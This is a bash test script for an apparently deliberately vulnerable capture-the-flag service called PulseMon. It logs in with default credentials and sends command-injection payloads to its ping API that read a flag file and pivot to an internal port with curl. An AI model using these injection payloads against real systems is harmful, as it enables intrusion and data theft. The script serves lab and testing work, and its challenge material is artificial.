#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for PulseMon on port 8081..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 8081 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] Service did not come up"
    $DC logs; exit 1
  fi
done
sleep 1

FAIL=0

# --- 1: login page loads ---
echo ""
echo "[*] Test 1 — login page renders"
OUT=$(curl -sf http://127.0.0.1:8081/login)
if echo "$OUT" | grep -q "PulseMon"; then
  echo "[PASS] login page renders"
else
  echo "[FAIL] login page: $OUT"; FAIL=1
fi

# --- 2: default creds work ---
echo ""
echo "[*] Test 2 — login with default credentials"
COOKIE=$(curl -sf -c - -X POST http://127.0.0.1:8081/login \
  -d "username=admin&password=monitor123" 2>/dev/null | grep 'auth' | awk '{print $NF}')
if [ -n "$COOKIE" ]; then
  echo "[PASS] login succeeds, auth cookie received"
else
  echo "[FAIL] no auth cookie after login"; FAIL=1
fi

# --- 3: flag1 via command injection ---
echo ""
echo "[*] Test 3 — command injection reads flag1"
OUT=$(curl -sf -b "auth=1" -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;cat /flag1.txt"}')
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')
  echo "[PASS] command injection: flag1 = $FLAG1"
else
  echo "[FAIL] command injection: $OUT"; FAIL=1
fi

# --- 4: internal pivot via curl to port 9090 ---
echo ""
echo "[*] Test 4 — internal pivot: curl to 127.0.0.1:9090"
OUT=$(curl -sf -b "auth=1" -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1;curl -s http://127.0.0.1:9090/"}')
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}')
  echo "[PASS] internal pivot: flag2 = $FLAG2"
else
  echo "[FAIL] internal pivot: $OUT"; FAIL=1
fi

# --- 5: clean input does not expose flags ---
echo ""
echo "[*] Test 5 — clean input does not expose flags"
OUT=$(curl -sf -b "auth=1" -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1"}')
if ! echo "$OUT" | grep -qE 'POC\{'; then
  echo "[PASS] clean input exposes no flag"
else
  echo "[FAIL] flag leaked on clean input"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
